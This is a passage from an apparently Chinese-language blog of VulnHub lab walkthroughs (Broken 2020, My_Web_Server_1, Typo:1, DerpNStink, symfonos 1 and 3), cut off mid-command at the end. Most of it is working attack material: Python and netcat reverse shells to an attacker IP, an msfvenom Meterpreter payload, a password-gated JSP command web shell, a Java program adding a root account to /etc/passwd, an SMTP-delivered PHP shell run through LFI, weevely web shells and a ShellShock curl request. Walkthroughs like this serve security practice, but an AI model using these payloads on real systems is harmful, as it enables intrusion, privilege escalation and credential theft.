src="/images/vulnhub_walkthrough_set/Broken-2020/img/06.png" alt="" /></p><p>访问新发现的目录<code>/cms/cc</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/07.png" alt="" /></p><p>尝试在端口输入处进行命令注入，失败</p><p>开启本地HTTP服务，再输入本地IP以及相应端口</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/08.png" alt="" /></p><p>可以看到该页面在请求本地资源<code>1c66b2e0cff58bal7b3f9a1994eb8c55.sh</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/09.png" alt="" /></p><p>构造一个反弹Shell的文件，并且监听端口，再在burp中触发该文件</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/10.png" alt="" /></p><p>目标机器上下载了该文件并且执行了，接收到反弹Shell</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/11.png" alt="" /></p><h2 id="权限提升-22"><a class="markdownIt-Anchor" href="#权限提升-22"></a> 权限提升</h2><p>查看目录<code>/home/alice</code>下的文本文件</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/12.png" alt="" /></p><p>这里提示root在后台运行清除apache日志的脚本，很存在crontab提权</p><p>下载pspy64</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/13.png" alt="" /></p><p>crontab运行任务如图，可以从<code>/home/alice/script/log.py</code>处入手</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/14.png" alt="" /></p><p>可以看到这个script目录所有人可写</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/15.png" alt="" /></p><p>即使文件log.py不可写，但是可以凭借目录的权限去修改文件名</p><p>本地构造Meterpreter的后门程序<br /><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9993 -f raw &gt; new.py</code></p><p>MSFConsole中进行相应配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9993</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>下载本地的后门程序，并且对文件名进行操作</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/16.png" alt="" /></p><p>接收到反弹shell，进入目录<code>/home/alice/backup/</code><br />查看所有文本文件</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/17.png" alt="" /></p><p>运行pspy64，<a href="http://xn--rootbackup-oh4pe03a8zfg4mfr4dhdohx0cr3zb6t2aoo5a.py">可以看到root正在运行脚本backup.py</a></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/18.png" alt="" /></p><p>将web目录输入至path.txt</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/19.png" alt="" /></p><p>可以看到html文件夹被备份到了该目录下<br />而且权限均为777</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/20.png" alt="" /></p><p>尝试打包目录<code>/root/</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/21.png" alt="" /></p><p>查看文件夹root下的内容</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/22.png" alt="" /></p><hr /><blockquote><p>目录权限&amp;crontab</p></blockquote><p>看着log.py的744权限也是有心无力，参考别人的WalkThrough之后才发现是目录的权限问题。目录可写则可以任意修改目录下的文件名，配合crontab则可以提权。</p><p>参考资料</p><blockquote><p><a href="https://medium.com/@arnavtripathy98/broken-2020-1-vulnhub-walkthrough-43293614944a">WalkThrough</a></p></blockquote><hr /><h1 id="my_web_server_1"><a class="markdownIt-Anchor" href="#my_web_server_1"></a> <a href="https://www.vulnhub.com/entry/my-web-server-1,463/">My_Web_Server_1</a></h1><p><code>2020/06/03 19:12:46</code></p><h2 id="寻找靶机ip-7"><a class="markdownIt-Anchor" href="#寻找靶机ip-7"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/00.png" alt="" /></p><h2 id="端口扫描-23"><a class="markdownIt-Anchor" href="#端口扫描-23"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.203</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/01.png" alt="" /></p><h2 id="web路径扫描-7"><a class="markdownIt-Anchor" href="#web路径扫描-7"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.203/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/02.png" alt="" /></p><p><code>dirb http://192.168.31.203:2222/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/03.png" alt="" /></p><p><code>dirb http://192.168.31.203:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/04.png" alt="" /></p><p><code>dirb http://192.168.31.203:8081/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/05.png" alt="" /></p><h2 id="漏洞利用-23"><a class="markdownIt-Anchor" href="#漏洞利用-23"></a> 漏洞利用</h2><p>可以看到有三个Web入口，端口分别是80,2222,8080,8081<br />2222端口上运行的是nostromo服务，使用searchsploit查看相关漏洞</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/06.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/07.png" alt="" /></p><p>存在RCE漏洞，在MSF中进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;nostromo_code_exec</span><br><span class="line">set RHOSTS 192.168.31.203</span><br><span class="line">set RPORT 2222</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>即可获得权限</p><h2 id="权限提升-23"><a class="markdownIt-Anchor" href="#权限提升-23"></a> 权限提升</h2><p>查看tomcat的Web账户</p><p><code>cat /usr/local/tomcat/conf/tomcat-users.xml</code><br /><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/08.png" alt="" /></p><p>访问<code>http://192.168.31.203:8080/</code>,点击<code>Manager App</code></p><p>使用账户<code>tomcat:@sprot0230sp</code>进行登入</p><p>将jsp后门压缩为zip并更改后缀名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip war.zip echo.jsp</span><br><span class="line">mv war.zip war.war</span><br></pre></td></tr></table></figure><p>登入tomcat的Web账户，上传jsp后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>利用原有的Shell构造python反弹Shell脚本<br />找一个可写目录<code>/var/nostromo/logs/</code>，<a href="http://xn--new-0v1e9ip79iu61b.py">写入脚本new.py</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os,socket,subprocess;</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&#39;192.168.31.10&#39;,8081));</span><br><span class="line">os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);</span><br><span class="line">p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);</span><br></pre></td></tr></table></figure><p>本地启用nc监听端口<br /><code>nc -lvvp 8081</code></p><p>访问jsp后门以执行命令<br /><code>http://192.168.31.203:8080/war/echo.jsp?pwd=pass&amp;i=python /var/nostromo/logs/new.py</code></p><p>接收到反弹的tomcat用户Shell</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/09.png" alt="" /></p><p>这里看到有bash的记录</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/10.png" alt="" /></p><p>使用过命令sudo -l</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/11.png" alt="" /></p><p>可以使用java进行sudo提权</p><p>本地构造java源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class sudo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder();</span><br><span class="line">    processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process process &#x3D; processBuilder.start();</span><br><span class="line">            BufferedReader reader &#x3D;</span><br><span class="line">                    new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            int exitCode &#x3D; process.waitFor();</span><br><span class="line">            System.out.println(&quot;\nExited with error code : &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即写入账户test:hackforfun</p><p>本地启用HTTP服务<br /><code>python -m SimpleHTTPServer 9900 &amp;</code></p><p>目标服务器上下载源码<br /><code>wget http://192.168.31.10:9900/sudo.java</code></p><p>编译并执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">sudo -u root &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;adoptopenjdk-8-hotspot-amd64&#x2F;bin&#x2F;java sudo</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/12.png" alt="" /></p><p>成功写入账户信息</p><p>获取pty<br /><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p>切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/13.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://www.youtube.com/watch?v=eOVm2G1sX4o">WalkThrough</a></p></blockquote><hr /><h1 id="typo1"><a class="markdownIt-Anchor" href="#typo1"></a> <a href="https://www.vulnhub.com/entry/typo-1,472/">Typo:1</a></h1><p><code>2020/06/09 21:51:36</code></p><h2 id="寻找靶机ip-8"><a class="markdownIt-Anchor" href="#寻找靶机ip-8"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/00.png" alt="" /></p><h2 id="端口扫描-24"><a class="markdownIt-Anchor" href="#端口扫描-24"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.26</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/01.png" alt="" /></p><h2 id="web路径扫描-8"><a class="markdownIt-Anchor" href="#web路径扫描-8"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.26/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/02.png" alt="" /></p><p><code>dirb http://192.168.31.26:8000/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/03.png" alt="" /></p><p><code>dirb http://192.168.31.26:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/04.png" alt="" /></p><p><code>dirb http://192.168.31.26:8081/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/05.png" alt="" /></p><h2 id="漏洞利用-24"><a class="markdownIt-Anchor" href="#漏洞利用-24"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.26/typo3/</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/06.png" alt="" /></p><p>访问<code>http://192.168.31.26:8080/phpinfo.php</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/07.png" alt="" /></p><p>访问<code>http://192.168.31.26:8081/phpmyadmin/</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/08.png" alt="" /></p><p>phpmyadmin存在弱口令<code>root:root</code></p><p>登入后查看数据库，typo3对应80端口的Web服务</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/09.png" alt="" /></p><p>可以替换表中的Hash值来获取账号权限</p><p>访问 <a href="https://argon2.online/">https://argon2.online/</a> 生成Hash</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/10.png" alt="" /></p><p><code>$argon2id$v=19$m=65536,t=16,p=2$MTIzNDU2Nzg$zsu3+i7HptpLzboB2NgkoqXdFnY1sfu2muwr4LFIbGo</code></p><p>替换Hash值之后登入Typo3后台，CMS设定中不允许上传php文件</p><p><code>Module Menu -&gt; ADMIN TOOLS -&gt; Settings -&gt; Configure Installation-Wide Options -&gt; Backend[BE] -&gt; [BE][fileDenyPattern]</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/11.png" alt="" /></p><p>清除内容即可解除对于文件上传的限制</p><p>使用weevely生成WebShell</p><p><code>weevely generate pass wee.php</code></p><p>上传WebShell</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/12.png" alt="" /></p><p>访问Shell</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/13.png" alt="" /></p><p>连接Shell</p><p><code>weevely http://192.168.31.26/fileadmin/wee.php pass</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/14.png" alt="" /></p><h2 id="权限提升-24"><a class="markdownIt-Anchor" href="#权限提升-24"></a> 权限提升</h2><p>使用python反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/15.png" alt="" /></p><p>获取pty</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/16.png" alt="" /></p><p>查看具有SUID权限的文件</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/17.png" alt="" /></p><p>这里的<code>/usr/local/bin</code>路劲下的文件明显是不对劲的</p><p>apache2-restart为ELF文件</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/18.png" alt="" /></p><p>使用strings命令查看文件字符</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/19.png" alt="" /></p><p>使用的是service命令</p><p>进行PATH提权</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/20.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://medium.com/@arnavtripathy98/typo-1-vulnhub-walkthrough-ecd2971da7f8">WalkThrough</a></p></blockquote><hr /><h1 id="derpnstink"><a class="markdownIt-Anchor" href="#derpnstink"></a> <a href="https://www.vulnhub.com/entry/derpnstink-1,221/">DerpNStink</a></h1><p><code>2020/06/22 14:53:48</code></p><h2 id="寻找靶机ip-9"><a class="markdownIt-Anchor" href="#寻找靶机ip-9"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 VMware</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/00.png" alt="" /></p><h2 id="端口扫描-25"><a class="markdownIt-Anchor" href="#端口扫描-25"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.61</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/01.png" alt="" /></p><h2 id="web路径扫描-9"><a class="markdownIt-Anchor" href="#web路径扫描-9"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.61/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/02.png" alt="" /></p><h2 id="漏洞利用-25"><a class="markdownIt-Anchor" href="#漏洞利用-25"></a> 漏洞利用</h2><p>目录/weblog/设置了302跳转并指向了一个域名，需要修改hosts文件</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/04.png" alt="" /></p><p>使用Wordpress框架，可以使用wpscan进行扫描</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/05.png" alt="" /></p><p><code>wpscan --url http://derpnstink.local/weblog/ -e u</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/06.png" alt="" /></p><p><code>wpscan --url http://derpnstink.local/weblog/ -e ap</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/07.png" alt="" /></p><p>查找插件相关信息<br /><code>searchsploit slideshow gallery 1.4.6</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/08.png" alt="" /></p><p>拷贝文件<br /><code>searchsploit -m 34681</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/09.png" alt="" /></p><p>需要Wordpress的账户</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/10.png" alt="" /></p><p>尝试弱口令得到账户<code>admin:admin</code></p><p>生成php后门<br /><code>weevely generate pass wee.php</code></p><p>使用脚本上传后门<br /><code>python 34681.txt -t http://derpnstink.local/weblog/ -u admin -p admin -f wee.php</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/11.png" alt="" /></p><p>连接后门<br /><code>weevely http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/wee.php pass</code></p><p>python反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8081</span><br><span class="line">-----</span><br><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/12.png" alt="" /></p><h2 id="权限提升-25"><a class="markdownIt-Anchor" href="#权限提升-25"></a> 权限提升</h2><p>获取pty</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/13.png" alt="" /></p><p>查看Wordpress配置信息<br /><code>cat /var/www/html/weblog/wp-config.php</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/14.png" alt="" /></p><p>得到unclestinky的密码Hash<br /><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/15.png" alt="" /></p><p>使用john破解Hash<br /><code>john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/16.png" alt="" /></p><p>得到密码</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/17.png" alt="" /><br /><code>stinky:wedgie57</code></p><p>尝试切换账户，成功</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/18.png" alt="" /></p><p>找到mrderp与stinky的对话</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/19.png" alt="" /></p><p>尝试寻找流量包</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/20.png" alt="" /></p><p>开启http服务，下载至本地</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/21.png" alt="" /></p><p>使用wireshark分析流量</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/22.png" alt="" /><br /><code>mrderp:derpderpderpderpderpderpderp</code></p><p>切换至用户mrderp</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/23.png" alt="" /></p><p>查看文件<br /><code>cat /home/mrderp/Desktop/helpdesk.log</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/24.png" alt="" /></p><p>访问链接</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/25.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/26.png" alt="" /></p><p>可以进行sudo提权</p><p>上传python反弹Shell脚本</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/27.png" alt="" /></p><p>提权为root</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/28.png" alt="" /></p><hr /><blockquote><p>密码共用</p></blockquote><p><s>太常规了</s></p><hr /><h1 id="symfonos-1"><a class="markdownIt-Anchor" href="#symfonos-1"></a> <a href="https://www.vulnhub.com/entry/symfonos-1,322/">symfonos 1</a></h1><p><code>2020/06/27 00:25:29</code></p><h2 id="寻找靶机ip-10"><a class="markdownIt-Anchor" href="#寻找靶机ip-10"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/00.png" alt="" /></p><h2 id="端口扫描-26"><a class="markdownIt-Anchor" href="#端口扫描-26"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/01.png" alt="" /></p><h2 id="web路径扫描-10"><a class="markdownIt-Anchor" href="#web路径扫描-10"></a> Web路径扫描</h2><p><code>dirb http://192.168.88.130/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/02.png" alt="" /></p><h2 id="漏洞利用-26"><a class="markdownIt-Anchor" href="#漏洞利用-26"></a> 漏洞利用</h2><p>收集smb信息<br /><code>enum4linux 192.168.88.130</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/04.png" alt="" /></p><p>目录/anonymous可以匿名访问<br />使用空账户即可登入</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/05.png" alt="" /></p><p>下载并查看<code>attention.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/06.png" alt="" /></p><p>文本中提到三个弱口令，可以使用这三个弱口令来尝试登入helios账户的个人目录<br /><code>smbclint //192.168.88.130/helios -U helios</code><br />使用口令 <code>qwerty</code> 即可登入</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/07.png" alt="" /></p><p>查看文本<code>todo.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/08.png" alt="" /><br />得到信息<code>/h3l105</code></p><p>Web主页如图</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/09.png" alt="" /></p><p>而且扫描Web目录时并未获取到有效信息<br />猜测<code>/h3l105</code>为Web目录</p><p>访问目录<code>/h3l105</code>，为Wordpress站点</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/10.png" alt="" /></p><p>使用wpscan进行扫描</p><p><code>wpscan --url http://192.168.88.130/h3l105/ -e ap --plugins-detection Aggressive</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/11.png" alt="" /></p><p>查询相关漏洞</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/12.png" alt="" /></p><p>使用Telnet连接SMTP服务来写入Webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.88.130 25</span><br><span class="line">MAIL FROM: &lt;Hacker&gt;</span><br><span class="line">RCPT TO: helios</span><br><span class="line">data</span><br><span class="line">&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/13.png" alt="" /></p><p>使用LFI来实现GetShell</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/14.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/15.png" alt="" /></p><p><code>http://192.168.88.130/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;pass=nc -e /bin/bash 192.168.88.129 8081</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/16.png" alt="" /></p><h2 id="权限提升-26"><a class="markdownIt-Anchor" href="#权限提升-26"></a> 权限提升</h2><p>查看具有SUID的程序</p><p><code>find / -user root -perm -4000 -print 2&gt; /dev/null</code><br /><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/17.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/18.png" alt="" /></p><p>可以进行PATH提权</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/19.png" alt="" /></p><hr /><blockquote><p>SMTP+LFI=GetShell</p></blockquote><ul><li>通过SMTP写入WebShel的内容（需要已知一个系统的用户名）</li><li>再利用LFI来执行WebShell（Web包含可以访问/var/mail）</li></ul><p>参考资料</p><blockquote><p><a href="https://medium.com/@markonsecurity/symfonos-1-walkthrough-vulnhub-df08dbcb0d36">WalkThrough</a></p></blockquote><hr /><h1 id="symfonos-3"><a class="markdownIt-Anchor" href="#symfonos-3"></a> <a href="https://www.vulnhub.com/entry/symfonos-31,332/">symfonos 3</a></h1><p><code>2020/07/05 15:27:23</code></p><h2 id="寻找靶机ip-11"><a class="markdownIt-Anchor" href="#寻找靶机ip-11"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/00.png" alt="" /></p><h2 id="端口扫描-27"><a class="markdownIt-Anchor" href="#端口扫描-27"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/01.png" alt="" /></p><h2 id="web路径扫描-11"><a class="markdownIt-Anchor" href="#web路径扫描-11"></a> Web路径扫描</h2><p><code>dirb http://192.168.88.130/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/02.png" alt="" /></p><h2 id="漏洞利用-27"><a class="markdownIt-Anchor" href="#漏洞利用-27"></a> 漏洞利用</h2><p>访问页面，在源代码出得到信息</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/03.png" alt="" /></p><p>尝试后发现存在路径<code>/cgi-bin/underworld</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/04.png" alt="" /></p><p>使用ShellShock漏洞反弹Shell<br /><code>curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; 